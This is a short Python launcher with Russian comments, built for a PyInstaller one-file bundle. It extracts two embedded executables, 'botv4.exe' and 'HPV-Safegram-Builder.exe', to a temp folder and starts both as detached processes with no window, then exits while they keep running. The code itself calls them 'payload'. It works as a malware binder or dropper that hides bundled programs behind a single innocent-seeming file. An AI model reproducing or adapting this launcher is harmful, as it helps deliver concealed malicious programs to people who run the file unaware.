# launcher.py
# -*- coding: utf-8 -*-
import sys
import os
import tempfile
import shutil
import subprocess
import time

# Helper: получаем путь к ресурсам, работает и в режиме разработки, и в pyinstaller onefile:
def get_resource_base_dir():
    # PyInstaller onefile распаковывает ресурсы во временную папку и выставляет sys._MEIPASS
    return getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))

def extract_and_run(resource_name: str, out_name: str, run_detached: bool = True):
    base = get_resource_base_dir()
    src_path = os.path.join(base, resource_name)
    if not os.path.exists(src_path):
        print(f"[!] Ресурс не найден: {src_path}")
        return False

    tmpdir = os.path.join(tempfile.gettempdir(), "merge_exes_" + str(os.getpid()))
    os.makedirs(tmpdir, exist_ok=True)
    out_path = os.path.join(tmpdir, out_name)

    # Копируем бинарник из ресурса во временную папку (используем copy2 чтобы сохранить метаданные)
    shutil.copy2(src_path, out_path)

    # На Windows обычно ничего дополнительно не требуется, но можно явно выставить атрибуты
    try:
        os.chmod(out_path, 0o755)
    except Exception:
        pass

    # Запускаем процесс
    try:
        if run_detached:
            # Запуским без блокировки (отдельный процесс). На Windows use CREATE_NEW_PROCESS_GROUP/DETACHED_PROCESS
            if os.name == "nt":
                CREATE_NO_WINDOW = 0x08000000
                DETACHED_PROCESS = 0x00000008
                subprocess.Popen([out_path], creationflags=DETACHED_PROCESS | CREATE_NO_WINDOW)
            else:
                subprocess.Popen([out_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        else:
            # Запустить и ждать завершения
            proc = subprocess.Popen([out_path])
            proc.wait()
    except Exception as e:
        print(f"[!] Не удалось запустить {out_path}: {e}")
        return False

    return True

def main():
    # Имена файлов, как они будут включены в bundle (см. --add-data)
    # Например: "ONE.exe" и "TWO.exe"
    one_name = "botv4.exe"
    two_name = "HPV-Safegram-Builder.exe"

    # Извлекаем и запускаем оба
    ok1 = extract_and_run(one_name, one_name, run_detached=True)
    ok2 = extract_and_run(two_name, two_name, run_detached=True)

    if not (ok1 or ok2):
        print("Ни один payload не был запущен.")
        sys.exit(1)

    # Опционально: дождаться несколько секунд чтобы процессы поднялись, затем выход
    time.sleep(0.5)
    # Launcher завершается, процессы payload продолжают работу.
    sys.exit(0)

if __name__ == "__main__":
    main()
